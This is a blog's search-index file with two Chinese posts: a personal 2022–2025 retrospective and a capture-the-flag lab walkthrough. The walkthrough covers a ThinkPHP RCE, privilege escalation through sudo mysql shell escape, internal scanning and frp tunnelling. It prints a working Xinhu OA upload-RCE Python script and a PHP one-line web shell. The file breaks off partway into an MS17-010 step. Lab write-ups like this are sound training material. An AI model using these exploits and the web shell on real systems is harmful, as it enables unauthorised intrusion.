<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022-2025，超级流水账总结</title>
    <link href="/2025/05/04/2022-2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/04/2022-2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>打个总结！</p><span id="more"></span><h3 id="0x01-开个头吧"><a href="#0x01-开个头吧" class="headerlink" title="0x01  开个头吧"></a>0x01  开个头吧</h3><p>​一直想对这三年写个小总结🥰之前看的很多东西都倾向去写这一年都做了什么、获得了什么。但我希望我尽可能写地全面些：全面到我都做了什么，没做成什么，获得了什么，又有哪些遗憾，甚至那些现在一想到就恨不得给自己两巴掌的蠢事(:D这种事好像还真不少)。</p><p>​虽然常说”生活就是所经历的一切&#x2F;生活就是一切体验的总和”。但我更倾向把生活、学习、(找)工作分开🤣只是因为这样写能让这篇总结的内容结构清晰点儿</p><p>​既然当时考研就是为了找个工作，那就先从工作写起好了。</p><h3 id="0x02-找-工作"><a href="#0x02-找-工作" class="headerlink" title="0x02 (找)工作"></a>0x02 (找)工作</h3><p>​找工作的过程算得上坎坷😑因为一直到<code>25</code>年<code>1</code>月份才拿到第一个录用通知：</p><img src="img/image-20250504213127298.png" alt="image-20250504213127298" style="zoom:33%;" /><p>​当时真的挺开心的，毕竟是省电信+当时我还一家都没签。不过犹豫了一两天还是给拒了🤣</p><p>​拒绝的理由也很简单：我想做我想做的东西。签了电信我也<code>100%</code>会后悔，那还是算了。</p><p>​我不想每天早上起来想的是“靠我今天还要上班”😥我当然知道降低期望才能提高幸福感，追求完美的代价无穷大且概率无穷小。但我希望——对于工作——至少工作内容是我喜欢的。</p><p>​感觉我是个特别在意我自己真正想要啥的人：工作也好，学东西也好，谈恋爱也好——我希望我能拿到<strong>绝对正确</strong>的选项，是我选择后不会质疑自己有没有选对的选项——如果不是那还是不要好了。</p><p>​当然在犹豫和琢磨的过程中放弃了挺多也绕了挺远的路，不过现在看结果还不错🙂我不后悔当时的每个选择</p><img src="img/v2-48ae4b4ff2a8539ba23807a8ada77d1f_r.jpg" alt="v2-48ae4b4ff2a8539ba23807a8ada77d1f_r" style="zoom:50%;" /><p>​后面在和我妈的几句话里结束了秋招:</p><img src="img/0ba9f21f7b6c20b8ccb5aafec506cba.jpg" alt="0ba9f21f7b6c20b8ccb5aafec506cba" style="zoom: 33%;" /><p>​哦对了，春招前还在绿盟那边实习了几个月🤗赚了点大米学了点东西</p><img src="img/0ab0347ea77d9b22c3441c90e0cd7b5.jpg" alt="0ab0347ea77d9b22c3441c90e0cd7b5" style="zoom:33%;" /><p>​后面的春招还算顺利吧(除了腾讯面我70多分钟然后给我挂了<code>TAT</code>)，陆陆续续拿了四个。在天翼和中国船级社之间犹豫了挺久最后去的中国船级社。</p><img src="img/image-20250511212153963.png" alt="image-20250511212153963" style="zoom:33%;" /><p>​刚看了下宁波的地理位置——发现我是顶级地理白痴😎竟然一直以为浙江在江苏上面，看来要继续往南走了🤔</p><h3 id="0x02-学习"><a href="#0x02-学习" class="headerlink" title="0x02 学习"></a>0x02 学习</h3><p>​想了半天，发现这三年也没学啥东西——小说倒是看了不少🤣：</p><img src="img/image-20250517173902418.png" alt="image-20250517173902418" style="zoom:33%;" /><p>​63本里47本都是小说：</p><img src="img/image-20250517174056036.png" alt="image-20250517174056036" style="zoom:33%;" /><p>​前阵子还拿了个2024年度阅读之星的奖：</p><img src="img/image-20250518202912055.png" alt="image-20250518202912055" style="zoom:50%;" /><p>​24年</p><p>😆</p><p>😀😁😂🤣😃😄😅😆😉😊😋😎🥲😙😗🥰😘😍😚☺️🙂🤗🤩🤔🫥😶😑😐🤨🫡😶‍🌫️🙄😏😣😥😮😴🥱😫😪😯🤐</p><p><img src="/img/0b24470ee9a5dc73d3940d2d55cf65af.jpg" alt="0b24470ee9a5dc73d3940d2d55cf65af"></p><p>​现在想想其实很多事情是我根本没法预料到的，比如我没有预料到我会在秋招时找到一个实习(:D)，更没想到这个实习机会是我投呼市那边的秋招岗拿到的。这样看以后还是少想些以后的事好了——如果能想到好事，那发生了也不会有啥惊喜&#x2F;如果能想到坏事，不管最后发没发生都延长了自己不开心的时间。</p><p>​收不住了好像:thinking:工作这部分先写到这儿。</p><h3 id="0x03-学习"><a href="#0x03-学习" class="headerlink" title="0x03 学习"></a>0x03 学习</h3><p>​:thinking: 想只写两部分：一个是读研时的研究方向，一个是这几年读过的书(害，其实<code>90%</code>以上都是小说。我这种人看不来散文&#x2F;随笔，当时借过&lt;瓦尔登湖&gt;&#x2F;&lt;西西弗神话&gt;看了几页就丢一边去了)。</p><p>​组里做的东西是往材料那边靠的(毕竟是通院的，做材料的水平没法跟人家材料院比)，偏向<code>MOF/COF</code>这类有机骨架材料的光学应用。比如传个信号啊做个传感器啊啥的。</p><p>​我自认为我这三年是比较摆的。虽然每周都开组会，但每次我那点工作量都少的可怜:smile: </p><p>​最后在摆了两年以后发了篇水水的文，满足了最低的毕业要求(:pray: 感谢爱斯维尔和那两位不知名的审稿人，从投稿到见刊只花了四十天，甚至我中间还拖了十来天啥也没干。。)：</p><p><img src="/img/image-20250101220035197.png" alt="image-20250101220035197"></p><p>​记得研一最开始我对这个研究方向还是挺头疼的，倒不是我不喜欢，主要这玩意儿和我以后工作没啥关系。后面也想通了(可能带点阿Q精神吧：我觉得读研学东西是次要的，最主要还是要学到遇到问题了，<strong>怎么分析问题，怎么处理解决问题</strong>，还有就是<strong>相信自己有解决任何问题的能力</strong>。如果很多人本科甚至高中就有这些能力了当然没必要往下继续读。)</p><p>​我写这些也不是说我现在</p><p>​这两年多一共在图书馆借了<code>59</code>本书：</p><p><img src="/img/image-20250103125943597.png" alt="image-20250103125943597"></p><p>​说到不务正业，想了想这两年半读完了哪些小说：</p><table><thead><tr><th>作者</th><th>推荐</th><th>一般</th><th>不推荐</th></tr></thead><tbody><tr><td>列夫·托尔斯泰</td><td>&lt;战争与和平&gt;，&lt;复活&gt;，&lt;穷人&gt;</td><td>&lt;安娜·卡列尼娜&gt;</td><td></td></tr><tr><td>海明威</td><td>&lt;老人与海&gt;，&lt;乞力马扎罗山的雪&gt;</td><td>&lt;丧钟为谁而鸣&gt;</td><td></td></tr><tr><td>陀思妥耶夫斯基</td><td></td><td>&lt;罪与罚&gt;，&lt;卡拉马佐夫兄弟&gt;(不喜欢陀氏是我的问题)</td><td></td></tr><tr><td>加缪</td><td>&lt;快乐的死&gt;，&lt;局外人&gt;</td><td>&lt;鼠疫&gt;</td><td></td></tr><tr><td></td><td>&lt;绞河镇的最后一夜&gt;</td><td></td><td></td></tr><tr><td>毛姆</td><td></td><td></td><td></td></tr><tr><td>狄更斯</td><td></td><td></td><td></td></tr><tr><td>格雷厄姆·格林</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><blockquote><p><strong>&lt;战争与和平&gt;</strong>, &lt;复活&gt;，&lt;安娜·卡列尼娜&gt;, <strong>&lt;穷人&gt;</strong>(短篇)</p><p>每次读完托尔斯泰都能平和不少，毕竟人家很多作品都宣传人性的真善美和强调追求道德的自我完善:)</p><p>&lt;罪与罚&gt;, &lt;卡拉马佐夫兄弟&gt;(陀氏的书暂时不会读了，一是我水平不够二是我对宗教这方面没啥兴趣，所以陀氏写的很多天人交战这种场面我内心没啥波澜)</p><p><strong>&lt;老人与海&gt;</strong>, <strong>&lt;乞力马扎罗山的雪&gt;</strong>(一个海明威的短篇小说合集), &lt;丧钟为谁而鸣&gt;</p><p><strong>&lt;快乐的死&gt;</strong>, &lt;鼠疫&gt;, <strong>&lt;局外人&gt;</strong></p><p><strong>&lt;愤怒的葡萄&gt;</strong>(这名字起的跟个科幻小说一样)</p><p>奥说到科幻小说，读了&lt;三体&gt;和大刘的几个短篇。后来发现对科幻小说兴趣一般就没找别的读了</p><p><strong>&lt;绞河镇的最后一夜&gt;</strong>)(一直特别喜欢这种从几岁一直写到几十岁的大部头，好像我花十几个小时就能经历几十年一样:laughing:赚翻了 )，&lt;新罕布什尔旅馆&gt;</p><p>**&lt;刀锋&gt;，&lt;人性的枷锁&gt;**，&lt;寻欢作乐&gt;，&lt;圣诞假日&gt;，&lt;面纱&gt;, &lt;月亮与六便士&gt;, &lt;毛姆短篇小说集&gt;</p><p>狄更斯的几部：**&lt;大卫·科波菲尔&gt;<strong>, <strong>&lt;远大前程&gt;</strong>, <strong>&lt;圣诞颂歌&gt;</strong>,</strong>&lt;雾都孤儿&gt;** </p><p>&lt;白夜行&gt;, &lt;海边的卡夫卡&gt; (日本人的小说永远不会再读了)</p><p><strong>&lt;长日将近&gt;</strong></p><p>&lt;曼城日与夜&gt;</p><p><strong>&lt;更多的人死于心碎&gt;</strong></p><p><strong>&lt;死亡间歇&gt;<strong>，</strong>&lt;失明症漫记&gt;</strong> (萨拉马戈的诺奖演说也很有意思——”人物如何当上师父，而作者成了他们的学徒“)</p><p><strong>&lt;窄门&gt;</strong></p><p><strong>&lt;少年维特的烦恼&gt;</strong></p><p>&lt;包法利夫人&gt;(非常不推荐。而且我发现福楼拜这人有个特点，他说什么他不喜欢在文章里用很多重复的词还是啥，这就导致对于同样一个人物——在一页书里可以出现三个名称指代他，而且外国人名和姓都很长有时候读着读着给我搞晕了🤕  )</p><p>&lt;红与黑&gt;(买错译本了，我这种没文化的看不了xx的译本)</p><p>&lt;了不起的盖茨比&gt;</p><p>&lt;呼啸山庄&gt;(及其不推荐，很少有一本小说能把我看得生气。这本书里的角色没一个是正常的，脑子多多少少带点问题。)</p><p><strong>&lt;悉达多&gt;<strong>，</strong>&lt;在轮上&gt;<strong>，</strong>&lt;荒原狼&gt;</strong></p><p><strong>&lt;权利与荣耀&gt;</strong>, &lt;一个燃尽自我的病人&gt;</p><p><strong>&lt;原野上&gt;<strong>，</strong>1</strong></p></blockquote><p>奥对了，还读了一本&lt;狗语大辞典&gt;，挺不错的。希望以后哪天可以和:dog:无障碍交流  ：</p><h3 id="0x04-生活"><a href="#0x04-生活" class="headerlink" title="0x04 生活"></a>0x04 生活</h3><p>​</p><p>​立今年最后一个<code>Flag</code>：:smiley_cat:<strong>正直</strong>，<strong>诚实</strong>，<strong>善良</strong>。我希望但更相信不管在什么情况下&#x2F;不管发生什么，我都会做到这三点。</p><p>​像这种总结写差不多了都要展望一下未来:smiley:那我希望明年比今年只好不坏✧٩(ˊωˋ*)و✧</p><p>​上周末看了毛姆的短篇&lt;爱德华·巴纳德的堕落&gt;，随便抄点当结尾吧：</p><blockquote><p>“从前，是为了应付考试读书，为了聊天时的谈资,为了获取知识读书。在这里，我学会为兴趣而读书。我学会了聊天。你知不知道，聊天是人生一大乐事？但聊天需要闲暇。以前一直都太忙。渐渐地，那些曾经对我而言十分重要的事情变得微不足道，无足轻重。纷纷扰扰、忙忙碌碌的生活有什么义呢？现在一想起芝加哥，我脑海里就勾画出一座昏暗的灰色城市，到处都是石头建筑——简直像座监狱——充斥着无无尽的混乱。所有那番纷扰意义何在？那就是人们想要过的生活吗？我们来到这个世上，就是为了那样的生活吗？匆匆忙忙到办公室，马不停蹄地工作到深夜，匆匆忙忙赶回家中，草草吃完饭，匆匆忙忙赶往电影院？我难道一定要这样虚掷自己的青春吗？青春短暂，贝特曼。等我老了，我还能有什么期盼？继续在早上匆匆忙忙赶到办公室，继续马不停蹄工作到深夜，继续匆匆忙忙赶回家中，草草吃完饭，匆匆忙忙赶往电影院吗？如果你能挣到大钱，那或许还值得。我不知道，这得看每个人的性格。如果挣不到大钱，那样做还值得吗？我想让我的生活更有意义，贝特曼。”<br>    “那你觉得生命的价值在哪里？<br>    “不怕你笑话。生命的价值在于真、善、美。”<br>    “你不觉得在芝加哥能追求到真、善、美吗？“</p><p>​”或许有些人可以，但是我不行。”爱德华蓦地站起身，“告诉你吧，想起以前过的日子，我感到恐惧不已，”他说得声嘶力喝“想起我逃离的危险，我浑身战栗。来到这里之后，我才发现我居然有灵魂。”</p><p>…….</p><p>“我感到如此困惑，不知道该说些什么。我来这里是因为我认为出了问题，原以为是你没有达成自己的心愿，由于失败所以羞于回去。我从未预料到会是这个样子。我极其抱歉，爱德华，我感到如此失望。我本来以为你能成就一番大事业，而你却以这样可悲的方式浪费了自己的才华和青春，也浪费了你的大好机遇。“<br>“不要伤心，老朋友，”爱德华说，“我没有失败，相反我成功了。你想象不到我对生活抱有怎样的热情，在我看来生活是多么充实、多么重要。当你跟伊莎贝尔结婚时，你会想到我的。我将在自己的珊瑚岛上建一座房子，然后住在那里，看护着我的树林，用无数年来一直沿袭的古老方式采集果实-一在花园里，我将种上各类花草;另外，还要去捕鱼。工作很多，会让我忙个不停，而又不会让我感到枯燥。我将拥有我的书籍、伊娃和孩子们，当然我希望首先能够拥有无以穷尽的海天风光，拥有清新的黎明，以及美丽的日落，还有浓郁而美妙的夜色。就在不久前还是一片荒原的土地上，我将开垦出一座花园，并进行一些创造。岁月将在不知不觉中悠然逝去，当我成为一个老人，回首往事时，我希望自己度过的是一个快乐、单纯、平和的人生;与此同时，我也将以个人微不足道的方式生活在美丽当中。你认为知足常乐无关紧要吗?要知道，一个人若失去了灵魂，即使得到了全世界，他也不会从中获益多少。我想我已经拥有了自己的灵魂。”</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>年终总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云境_Initial</title>
    <link href="/2025/01/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83_Initial/"/>
    <url>/2025/01/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83_Initial/</url>
    
    <content type="html"><![CDATA[<p>唉，学</p><span id="more"></span><h3 id="0x01-Flag01"><a href="#0x01-Flag01" class="headerlink" title="0x01 Flag01"></a>0x01 Flag01</h3><p><img src="/img/image-20241230163501619-1735891210019-1.png" alt="image-20241230163501619"></p><p><code>39.99.229.166</code>，棱镜扫下常用端口:</p><p><img src="/img/image-20241230163720929-1735891214172-3.png" alt="image-20241230163720929"></p><p>开了<code>22</code>还有<code>80</code>，<code>80</code>是个<code>http</code>服务。<code>EZ</code>看指纹没啥收获，<code>fscan</code>扫：</p><p><img src="/img/image-20250103103946225.png" alt="image-20250103103946225"></p><p><code>thinkphp5023RCE</code>，直接用工具：</p><p><img src="/img/image-20241230170422244-1735891217007-5.png" alt="image-20241230170422244"></p><p>蚁剑连接：</p><p><img src="/img/image-20241230170537852-1735891219844-7.png" alt="image-20241230170537852"></p><p>打开终端后发现当前用户是<code>www-data</code>，这个用户权限比较低。先尝试提权，发现他这个<code>Mysql</code>开了免密登录，登陆后能以<code>root</code>身份执行命令(<code>mysql -e</code>)：</p><p><img src="/img/image-20241230172115168-1735891224751-9.png" alt="image-20241230172115168"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mysql -e <span class="hljs-string">&#x27;\! find / -name flag*&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20241230172846788-1735891226886-11.png" alt="image-20241230172846788"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mysql -e <span class="hljs-string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20241230172925606-1735891229292-13.png" alt="image-20241230172925606"></p><h3 id="0x02-Flag02"><a href="#0x02-Flag02" class="headerlink" title="0x02 Flag02"></a>0x02 Flag02</h3><p><code>ifconfig</code>看网络信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">(www-data:/var/www/html) $ ifconfig<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255<br>        inet6 fe80::216:3eff:fe05:3164  prefixlen 64  scopeid 0x20&lt;<span class="hljs-built_in">link</span>&gt;<br>        ether 00:16:3e:05:31:64  txqueuelen 1000  (Ethernet)<br>        RX packets 128728  bytes 153547480 (153.5 MB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 35118  bytes 7563272 (7.5 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen 1000  (Local Loopback)<br>        RX packets 1686  bytes 146020 (146.0 KB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 1686  bytes 146020 (146.0 KB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br></code></pre></td></tr></table></figure><p>用蚁剑在刚才之前传马那个目录传个<code>fscan</code>上去：</p><p><img src="/img/image-20241231141011778.png" alt="image-20241231141011778"></p><p>给执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mysql -e <span class="hljs-string">&#x27;\! chmod 777 /var/www/html/fscan*&#x27;</span><br></code></pre></td></tr></table></figure><p>扫内网:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan_amd64 -h 172.22.1.0/24<br><span class="hljs-built_in">cat</span> result.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250103104235728.png" alt="image-20250103104235728"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.18:139</span> open<br><span class="hljs-number">172.22.1.2:139</span> open<br><span class="hljs-number">172.22.1.21:135</span> open<br><span class="hljs-number">172.22.1.18:135</span> open<br><span class="hljs-number">172.22.1.2:135</span> open<br><span class="hljs-number">172.22.1.18:80</span> open<br><span class="hljs-number">172.22.1.15:80</span> open<br><span class="hljs-number">172.22.1.18:3306</span> open<br><span class="hljs-number">172.22.1.21:445</span> open<br><span class="hljs-number">172.22.1.18:445</span> open<br><span class="hljs-number">172.22.1.2:445</span> open<br><span class="hljs-number">172.22.1.2:88</span> open<br><span class="hljs-number">172.22.1.21:139</span> open<br><span class="hljs-number">172.22.1.15:22</span> open<br><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>      <span class="hljs-string">[+]</span>DC DC01.xiaorang.lab             Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span> <br><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">15</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">5578</span>   title:Bootstrap Material Admin<br><span class="hljs-string">[*]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br>   <span class="hljs-string">[-&gt;]</span>DC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br><span class="hljs-string">[*]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-WIN7<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span><br><span class="hljs-string">[*]</span> NetInfo:<br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-OA01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span><br><span class="hljs-string">[*]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>  (Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>        code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>?m=login<br><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="hljs-number">2012</span> R2 Datacenter <span class="hljs-number">9600</span> <br><span class="hljs-string">[+]</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span>    MS17-<span class="hljs-number">010</span>    (Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>)<br><span class="hljs-string">[*]</span> NetBios: <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span>     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> <br><span class="hljs-string">[*]</span> WebTitle: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>?m=login code:<span class="hljs-number">200</span> len:<span class="hljs-number">4012</span>   title:信呼协同办公系统<br><span class="hljs-string">[+]</span> http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">15</span> poc-yaml-thinkphp5023-method-rce poc1<br></code></pre></td></tr></table></figure><p>获得内网信息：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.2</span>   DC域控<br><span class="hljs-number">172.22.1.21</span>  MS17-<span class="hljs-number">010</span>永恒之蓝<br><span class="hljs-number">172.22.1.18</span>  信呼OA系统<br></code></pre></td></tr></table></figure><p>先打这个信呼OA，不过要搭个隧道进内网(利用<code>frp+proxifier</code>)。先利用蚁剑上传<code>frpc</code>和<code>frpc.ini</code>:</p><p><img src="/img/image-20250103103233933.png" alt="image-20250103103233933"></p><p>和上面的<code>fscan</code>一样，给执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x frpc<br></code></pre></td></tr></table></figure><p>然后可以参考<a href="https://blog.csdn.net/weixin_63576152/article/details/133462540?spm=1001.2014.3001.5501">代理配置</a></p><p>都配置完就能访问内网里的这个服务(<code>172.22.1.18</code>)了：</p><p><img src="/img/image-20250103170527505.png" alt="image-20250103170527505"></p><p>碰到这种没验证码的登录框先尝试弱口令。<code>admin/admin123</code>发现能登录：</p><p><img src="/img/image-20250103170600031.png" alt="image-20250103170600031"></p><p>转了一圈儿也不知道咋利用，后面发现有现成的<code>exp</code>可以打:<a href="https://blog.csdn.net/solitudi/article/details/118675321">代码审计信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE</a></p><p>唉，脚本小子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br> <br>session = requests.session()<br> <br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br> <br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br> <br> <br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br> <br>filepath = <span class="hljs-built_in">str</span>(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br> <br>url3 = url_pre + <span class="hljs-string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span><br> <br>r = session.get(url3)<br>r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>这里<code>1.php</code>的内容是一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>exp</code>跑完输出的是写马进去的路径(不过要注意他这个是绝对路径)。</p><p><img src="/img/image-20250103171435050.png" alt="image-20250103171435050"></p><p>使用蚁剑之前配置下代理：</p><p><img src="/img/455d8e9e43ced978235032398a542623.png" alt="455d8e9e43ced978235032398a542623"></p><p>蚁剑连接<code>https://172.22.1.18/upload+</code>后面那一串儿：，<code>flag</code>位于<code>C://Users/Administrator/flag/flag02.txt</code>：</p><p><img src="/img/image-20250103171548839.png" alt="image-20250103171548839"></p><p>获得<code>flag02</code>后它提示我们去打域控。</p><h3 id="0x03-Flag03"><a href="#0x03-Flag03" class="headerlink" title="0x03 Flag03"></a>0x03 Flag03</h3><p>最后打MS17-010，需要利用proxifier+msf攻击</p><p>首先配置一下proxychains（把公网服务器作为代理来进入内网）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span 